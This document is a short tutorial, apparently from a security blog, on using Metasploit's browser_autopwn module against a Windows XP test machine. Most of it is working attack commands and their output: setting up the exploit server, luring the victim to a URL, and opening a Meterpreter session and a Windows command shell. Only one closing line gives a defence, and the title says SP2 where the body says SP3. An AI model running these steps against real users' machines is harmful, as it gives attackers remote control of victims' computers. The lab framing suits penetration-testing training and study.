Metasploit Browser Autopwn – Windows XP SP2
**Attacker:** Kali Linux<br>
**Victim:** Windows XP SP3 (Java 6u25, IE6)<br>
##Step 1 – Starting the Browser Autopwn Server
Run msfconsole, load the browser_autopwn module and set all required options.<br>
<code>
<div class="code">
root@kali:~$ <com>msfconsole</com><br>
msf > <com>use auxiliary/server/browser_autopwn</com><br>
msf auxiliary(browser_autopwn) > <com>set LHOST 192.168.1.12</com><br>
msf auxiliary(browser_autopwn) > <com>set SRVPORT 80</com><br>
msf auxiliary(browser_autopwn) > <com>set URIPATH /</com><br>
msf auxiliary(browser_autopwn) > <com>run</com><br>
<br>
[*] Starting exploit modules on host 192.168.1.12...<br>
[*] Server started.
</div>
</code>
The Browser Autopwn Server is now running and waiting for victims to browse to the url http://192.168.1.12<br>
##Step 2 – Pwning the Victim
On your Windows XP test machine (victim), browse to http://192.168.1.12.<br>
This will trigger the browser_autopwn module to serve the appropriate exploit and launch a meterpreter session.<br>
<code>
<div class="code">
[*] Meterpreter session 1 opened (192.168.1.12:7777 -> <br>
192.168.1.13:1045) at 2015-07-25 05:08:06 -0400<br>
...<br>
msf auxiliary(browser_autopwn) ><com> sessions -i 1</com><br>
[*] Starting interaction with 1...meterpreter ><com> shell</com><br>
Microsoft Windows XP [Version 5.1.2600]<br>
(C) Copyright 1985-2001 Microsoft Corp.<br>
C:\Documents and Settings\IEUser\Desktop><com>echo %USERNAME%</com><br>
Victim<br>
<br>
C:\Documents and Settings\IEUser\Desktop><com>ipconfig</com><br>
Windows IP Configuration<br>
<br>
Ethernet adapter Local Area Connection:<br>
<br>
Connection-specific DNS Suffix . : Home<br>
IP Address. . . . . . . . . . . . : 192.168.1.13<br>
Subnet Mask . . . . . . . . . . . : 255.255.255.0<br>
Default Gateway . . . . . . . . . : 192.168.1.1<br>
<br>
C:\Documents and Settings\IEUser\Desktop><br>
</div>
</code>
You now have shell access to the Windows XP SP3 Victim with the same access as the user who navigated to the exploit url.<br>
##Solution
Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.

Tags: metasploit
